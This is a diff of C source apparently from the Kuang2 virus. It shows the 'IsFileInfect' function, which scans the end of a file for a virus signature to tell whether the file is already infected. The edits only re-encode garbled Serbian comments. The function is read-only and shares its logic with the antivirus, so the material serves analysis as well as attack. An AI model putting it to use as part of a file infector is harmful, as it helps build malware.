@@ -1,7 +1,7 @@
 /***[ThuNderSoft]*************************************************************
 							  KUANG2: IsFileInfect
 								   ver: 0.10
-								úùÄÍ WEIRD ÍÄùú
+								     WEIRD
 *****************************************************************************/
 
 /* HISTORY */
@@ -10,19 +10,19 @@
 #include <windows.h>
 #include <strmem.h>
 
-// minimalna veliina fajla	 ( < veliine dodatog virusa)
+// minimalna veliÄina fajla	 ( < veliÄine dodatog virusa)
 #define		MIN_FILE_LEN	9000
-// koliko od kraja fajla treba poeti skeniranje ( > veliine dodatog virusa)
+// koliko od kraja fajla treba poÄeti skeniranje ( > veliÄine dodatog virusa)
 #define		FROM_END		12500
 
 /*
 	IsFileInfect
 	------------
-  ş proverava da li je neki fajl ve† inficiran.
-  ş mora posebno jer vr„i samo itanje.
-  ş vra†a -1 za tehnike probleme, 0 za ist fajl, 1 za inficiran
-  ş indetino u virusu i antivirusu
-  ş brz i inteligentan. */
+  + proverava da li je neki fajl veÄ‡ inficiran.
+  + mora posebno jer vrÅ¡i samo Äitanje.
+  + vraÄ‡a -1 za tehniÄke probleme, 0 za Äist fajl, 1 za inficiran
+  + indetiÄno u virusu i antivirusu
+  + brz i inteligentan. */
 
 int IsFileInfect(char *fname, char* virus_sign) {
 	HANDLE hfile, hfilemap;
@@ -32,7 +32,7 @@ int IsFileInfect(char *fname, char* virus_sign) {
 	unsigned int retvalue;
 	unsigned int koliko;
 
-	retvalue=-1;						// oznai tehniku gre„ku (default)
+	retvalue=-1;						// oznaÄi tehniÄku greÅ¡ku (default)
 
 	fattr=GetFileAttributes(fname);		// uzmi atribute fajla
 
@@ -40,12 +40,12 @@ int IsFileInfect(char *fname, char* virus_sign) {
 	hfile=CreateFile(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
 	if (hfile==INVALID_HANDLE_VALUE) goto end1;
 
-	// uzmi veliinu fajla
+	// uzmi veliÂinu fajla
 	fsize=GetFileSize(hfile, NULL);
-	if (fsize==0xFFFFFFFF) goto end2;	// gre„ka
-	if (fsize<MIN_FILE_LEN) {			// ako je veliina fajla manja
-		retvalue=0;						// od veliine dodatog virusa
-		goto end2;						// znai da je fajl ist (0)
+	if (fsize==0xFFFFFFFF) goto end2;	// greÅ¡ka
+	if (fsize<MIN_FILE_LEN) {			// ako je veliÄina fajla manja
+		retvalue=0;						// od veliÄine dodatog virusa
+		goto end2;						// znaÄi da je fajl Äist (0)
 	}
 
 	// kreiramo MMF
@@ -56,16 +56,16 @@ int IsFileInfect(char *fname, char* virus_sign) {
 	if (filemap==NULL) goto end3;
 	filestart=filemap;
 
-	// odredi poetak skeniranja...
-	if (fsize>FROM_END) {				// ako je fajl ve†i od FROM_END
+	// odredi poÄetak skeniranja...
+	if (fsize>FROM_END) {				// ako je fajl veÄ‡i od FROM_END
 		filemap+=(fsize-FROM_END);		// pomeri se tako da ima FROM_END do kraja
-		koliko=FROM_END;				// oznai koliko ima za skeniranje
-	} else koliko=fsize;				// oznai da se ceo fajl skenira
+		koliko=FROM_END;				// oznaÄi koliko ima za skeniranje
+	} else koliko=fsize;				// oznaÄi da se ceo fajl skenira
 
-	// proveri da li je ve† zara‚en (ak 50 znakova!)
+	// proveri da li je veÄ‡ zaraÅ¾en (Äak 50 znakova!)
 	if (memfind(filemap, koliko, virus_sign, 50)!=-1)
-		retvalue=1;					// zara‚en fajl
-		else retvalue=0;			// ist fajl
+		retvalue=1;					// zaraÅ¾en fajl
+		else retvalue=0;			// Äist fajl
 
 	UnmapViewOfFile(filestart); // zatvari MMF view
 end3:
